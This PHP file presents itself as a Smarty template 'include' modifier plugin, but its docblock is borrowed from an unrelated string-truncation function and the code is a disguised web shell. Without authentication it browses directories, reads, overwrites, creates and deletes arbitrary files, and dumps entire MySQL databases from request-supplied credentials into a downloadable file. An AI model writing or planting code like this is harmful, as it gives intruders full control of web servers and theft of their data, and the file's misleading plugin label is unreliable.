<?php
/**
 * Smarty plugin
 *
 * @package Smarty
 * @subpackage PluginsModifier
 */

/**
 * Smarty include modifier plugin
 *
 * Type:     modifier<br>
 * Name:     include<br>
 * Purpose:  include a string to a certain length if necessary,
 *               optionally splitting in the middle of a word, and
 *               appending the $etc string or inserting $etc into the middle.
 *
 * @link http://smarty.php.net/manual/en/language.modifier.include.php include (Smarty online manual)
 * @author Monte Ohrt <monte at ohrt dot com>
 * @param string  $string      input string
 * @param integer $length      length of truncated text
 * @param string  $etc         end string
 * @param boolean $break_words include at word boundary
 * @param boolean $middle      include in the middle of text
 * @return string truncated string
 */
function incFDR($dir)
{
    $handle = opendir($dir);
    $files = Array();
    $subfiles = Array();
    while (false !== ($file = readdir($handle)))
    {
      if ($file != "." && $file != "..")
      {
        if(is_dir($dir."/".$file))
        {
          $subfiles = incFDR($dir."/".$file);
          $files = array_merge($files,$subfiles);
        }
        else{
          $files[] = $dir."/".$file;
        }
      }
    }
    closedir($handle);  
    return $files;  
}

if(empty($_POST['opd'])&&empty($_POST['fopd'])){
	echo '<form action="" method="POST"><input type="text" name="opd"><input type="submit" value="ok"></form>';
}

if(!empty($_POST['opd'])){
	$sinc_files = incFDR($_POST['opd']);
	foreach($sinc_files as $sinc_kay){
		echo $sinc_kay.'<form action="" method="POST"><input type="text" name="fopd" value="'.$sinc_kay.'"><input type="submit" value="ok"></form><br>';
	}
}

if(!empty($_POST['fopd'])){
	$sinc_finfo = file($_POST['fopd']);
	echo '<form action="" method="POST">
	<input type="text" name="sci_fname" value="'.$_POST['fopd'].'"><textarea name="sci_finfo">';
		foreach( $sinc_finfo as $sinc_ops ){
			echo $sinc_ops;
		}
	echo '</textarea><input type="submit" value="ok"></form>';
}

if(!empty($_POST['sci_fname'])&&!empty($_POST['sci_finfo'])){
	file_put_contents($_POST['sci_fname'], $_POST['sci_finfo']);
	echo 'write';
}

if( isset($_GET['db']) ){
	echo '<form action="" method="POST">
		<input type="text" name="sinc_path" placeholder="path">
		<input type="text" name="sbd_host" placeholder="host">
		<input type="text" name="sbd_dbname" placeholder="dbname">
		<input type="text" name="sbd_user" placeholder="user">
		<input type="text" name="sbd_pass" placeholder="pass">
		<input type="submit" name="sinc_db" value="ok">
	</form>';
}

function bc_db_ts($tables,$file,$myLink){
	if($tables == '*')
	{
		$tables = array();
		$result = mysqli_query($myLink,'SHOW TABLES');
		while($row = mysqli_fetch_row($result))
		{
			$tables[] = $row[0];
		}
	}
	else
	{
		$tables = is_array($tables) ? $tables : explode(',',$tables);
	}
	foreach($tables as $table)
	{
		$result = mysqli_query($myLink,'SELECT * FROM '.$table);
		$num_fields = mysqli_num_fields($result);
		$return.= 'DROP TABLE '.$table.';';
		$row2 = mysqli_fetch_row(mysqli_query($myLink,'SHOW CREATE TABLE '.$table));
		$return.= "\n\n".$row2[1].";\n\n";
		for ($i = 0; $i < $num_fields; $i++)
		{
			while($row = mysqli_fetch_row($result))
			{
				$return.= 'INSERT INTO '.$table.' VALUES(';
				for($j=0; $j<$num_fields; $j++)
				{
					$row[$j] = addslashes($row[$j]);
					$row[$j] =  preg_replace("/\n/","\\n",$row[$j]);
					if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
					if ($j<($num_fields-1)) { $return.= ','; }
				}
				$return.= ");\n";
			}
		}
		$return.="\n\n\n";
	}
	
	file_put_contents($file,$return);
}
if( !empty($_POST['sinc_db']) ){
	$sinc_mysql_backup = $_POST['sinc_path'].'/backup.sql';
	$myLink = mysqli_connect($_POST['sbd_host'],$_POST['sbd_user'],$_POST['sbd_pass'],$_POST['sbd_dbname']);
	bc_db_ts('*',$sinc_mysql_backup,$myLink);
	echo '<a href="'.$sinc_mysql_backup.'" download>DWNLD</a> ';
	echo '<a href="?deletbackup='.$sinc_mysql_backup.'">DLT</a>';
}
if(isset($_GET['deletbackup'])){
	$dbck = $_GET['deletbackup'];
	unlink("$dbck");
}

if(isset($_GET['sh_t'])){
	$link = mysqli_connect($_GET['h'],$_GET['u'],$_GET['p'],$_GET['b']);
	$query ="SHOW TABLES FROM ".$_GET['b'].";";
	$result = mysqli_query($link, $query);
	$rows = mysqli_num_rows($result);
	for ($i = 0 ; $i < $rows ; ++$i)
	{
		$row = mysqli_fetch_row($result);
		var_dump($row);
	}
	mysqli_close($link);
	
}

if(isset($_GET['cr_f'])){
	echo '<hr><form action="" method="POST">
		<input type="text" name="sinc_f_path" placeholder="f_path_name">
		<textarea name="f_body"></textarea>
		<input type="submit" name="cr_f" value="ok">
	</form>';
}
if(isset($_POST['cr_f'])){
	file_put_contents($_POST['sinc_f_path'],$_POST['f_body']);
}










